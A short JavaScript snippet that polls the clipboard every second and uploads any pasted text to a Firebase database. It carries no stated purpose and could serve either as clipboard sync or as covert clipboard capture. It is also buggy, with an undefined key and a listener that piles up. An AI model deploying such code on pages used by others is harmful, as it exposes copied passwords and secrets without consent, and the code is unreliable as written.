var db = firebase.database().ref();
var clipText;

setInterval(function() {

	document.addEventListener('paste', function(event) {

		clipText = event.clipboardData.getData('Text');

		if (clipText != null) {

			db.child(data).set(clipText);
		} else {

			console.log('Cliptext is null...');
		}
	});

	document.execCommand('paste');
}, 1000);